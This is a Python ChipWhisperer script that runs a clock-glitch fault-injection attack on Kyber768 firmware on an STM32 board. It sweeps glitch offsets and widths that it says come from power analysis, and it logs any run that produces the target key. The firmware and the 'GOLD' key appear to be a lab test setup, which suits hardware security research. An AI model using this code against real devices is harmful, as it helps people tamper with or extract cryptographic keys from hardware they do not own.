#!/usr/bin/env python3
"""
CPA-Based Precision Glitch Attack for Kyber768
Uses ONLY CPA-derived parameters - sweeps the entire recommended ext_offset range.

CPA Results:
- Sample 426 → ext_offset = 106 (primary)
- Sample 135 → ext_offset = 33 (secondary)
- Sample 430 → ext_offset = 107
- Sample 711 → ext_offset = 177
- Sample 1303 → ext_offset = 325
"""

import chipwhisperer as cw
import time
import numpy as np
import os
from datetime import datetime

FW_PATH = "bin/test_glitch.hex"

# CPA-derived parameters - sweep all candidate offsets
CPA_EXT_OFFSETS = [106, 107, 105, 104, 103, 108, 109, 110, 33, 34, 35]  # Primary candidates
WIDTH_OPTIONS = [1, 2, 3]  # Minimal widths for precision
OFFSET_RANGE = np.arange(-12.0, 12.0, 1.0)  # Reasonable offset sweep
MAX_ATTEMPTS = 20000

def setup():
    """Initialize ChipWhisperer for precision glitching."""
    print("="*60)
    print("CPA-BASED PRECISION GLITCH ATTACK")
    print("="*60)
    
    scope = cw.scope()
    target = cw.target(scope)
    
    scope.default_setup()
    scope.clock.clkgen_freq = 7372800
    scope.clock.adc_src = "clkgen_x4"
    scope.io.tio1 = "serial_rx"
    scope.io.tio2 = "serial_tx"
    scope.trigger.triggers = "tio4"
    target.baud = 38400
    
    # Glitch configuration
    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "enable_only"
    scope.glitch.trigger_src = "ext_single"
    scope.io.glitch_lp = True
    scope.io.glitch_hp = True
    scope.glitch.repeat = 1
    
    return scope, target

def reset(scope, target):
    """Reset the target device."""
    scope.io.nrst = 'low'
    time.sleep(0.05)
    scope.io.nrst = 'high_z'
    time.sleep(0.1)
    target.flush()

def glitch(scope, target, target_key, baseline_key):
    """Execute a single glitch attempt."""
    target.flush()
    
    # Wait for WAIT signal
    r = ""
    t = time.time()
    while time.time() - t < 0.4:
        if target.in_waiting():
            r += target.read()
            if "WAIT" in r:
                break
        time.sleep(0.005)
    
    if "WAIT" not in r:
        return "timeout", None, None
    
    # Arm and capture
    scope.arm()
    if scope.capture():
        return "no_trig", None, None
    
    # Read result
    r = ""
    t = time.time()
    while time.time() - t < 0.4:
        if target.in_waiting():
            r += target.read()
            if "KEY:" in r and "\n" in r[r.find("KEY:"):]:
                break
        time.sleep(0.005)
    
    if target_key in r:
        return "SUCCESS", scope.get_last_trace(), target_key
    elif baseline_key in r:
        return "normal", None, baseline_key
    elif "KEY:" in r:
        idx = r.find("KEY:") + 4
        key = r[idx:idx+70].strip().split()[0] if len(r) > idx else "?"
        return "different", None, key
    else:
        return "crash", None, None

def main():
    scope, target = setup()
    
    print(f"Programming {FW_PATH}...")
    cw.program_target(scope, cw.programmers.STM32FProgrammer, FW_PATH)
    print("OK")
    
    reset(scope, target)
    time.sleep(0.5)
    
    # Read boot output and get keys
    out = ""
    t = time.time()
    while time.time() - t < 5:
        if target.in_waiting():
            out += target.read()
        time.sleep(0.02)
    
    # Extract keys
    if "GOLD:" not in out:
        print("ERROR: No GOLD key!")
        scope.dis(); return
    
    idx = out.index("GOLD:") + 5
    target_key = out[idx:].strip().split()[0]
    
    if "KEY:" not in out:
        print("ERROR: No baseline KEY!")
        scope.dis(); return
    
    idx = out.index("KEY:") + 4
    baseline_key = out[idx:].strip().split()[0]
    
    print(f"TARGET (GOLD): {target_key[:40]}...")
    print(f"BASELINE:      {baseline_key[:40]}...")
    
    if target_key == baseline_key:
        print("ERROR: Keys are SAME!")
        scope.dis(); return
    
    print(f"\nCPA-DERIVED PARAMETERS:")
    print(f"  ext_offsets: {CPA_EXT_OFFSETS}")
    print(f"  widths:      {WIDTH_OPTIONS}")
    print(f"  offset:      {OFFSET_RANGE[0]:.1f} to {OFFSET_RANGE[-1]:.1f}")
    print(f"  max:         {MAX_ATTEMPTS}")
    print(f"Started:       {datetime.now()}")
    print("="*60)
    
    os.makedirs("traces_cpa_attack", exist_ok=True)
    
    total = crashes = timeouts = normal = different = 0
    
    try:
        cycle = 0
        while total < MAX_ATTEMPTS:
            cycle += 1
            
            # Sweep: ext_offsets -> widths -> offsets
            for ext in CPA_EXT_OFFSETS:
                scope.glitch.ext_offset = ext
                
                for w in WIDTH_OPTIONS:
                    scope.glitch.width = w
                    
                    for off in OFFSET_RANGE:
                        scope.glitch.offset = off
                        total += 1
                        
                        res, trace, key = glitch(scope, target, target_key, baseline_key)
                        
                        if res == "SUCCESS":
                            print(f"\n{'='*60}")
                            print("*** SUCCESS! ***")
                            print(f"ext_offset={ext}, width={w}, offset={off}")
                            print(f"attempts={total}")
                            print(f"{'='*60}")
                            
                            np.save(f"traces_cpa_attack/SUCCESS_e{ext}_w{w}_o{off}.npy", trace)
                            with open("KYBER_SUCCESS_CPA.txt", "w") as f:
                                f.write(f"SUCCESS!\next_offset={ext}\nwidth={w}\noffset={off}\nattempts={total}\n")
                                f.write(f"target_key={target_key}\n")
                            scope.dis(); return
                        
                        elif res == "different":
                            different += 1
                            if different <= 5:
                                print(f"[!] Different at ext={ext} w={w} off={off:.1f}: {key[:30]}...")
                        elif res == "normal":
                            normal += 1
                        elif res in ("crash", "no_trig"):
                            crashes += 1
                            if crashes % 30 == 0:
                                reset(scope, target)
                                time.sleep(0.1)
                        else:
                            timeouts += 1
                            if timeouts % 20 == 0:
                                reset(scope, target)
                                time.sleep(0.1)
                        
                        if total >= MAX_ATTEMPTS:
                            break
                    if total >= MAX_ATTEMPTS:
                        break
                if total >= MAX_ATTEMPTS:
                    break
            
            crash_pct = crashes / total * 100 if total > 0 else 0
            norm_pct = normal / total * 100 if total > 0 else 0
            print(f"Cycle {cycle}: {total} | Crash:{crashes}({crash_pct:.1f}%) Norm:{normal}({norm_pct:.1f}%) Diff:{different} TO:{timeouts}")
        
        print(f"\nNo success after {total} attempts.")
    
    except KeyboardInterrupt:
        print(f"\nStopped at {total}")
    finally:
        scope.dis(); target.dis()

if __name__ == "__main__":
    main()
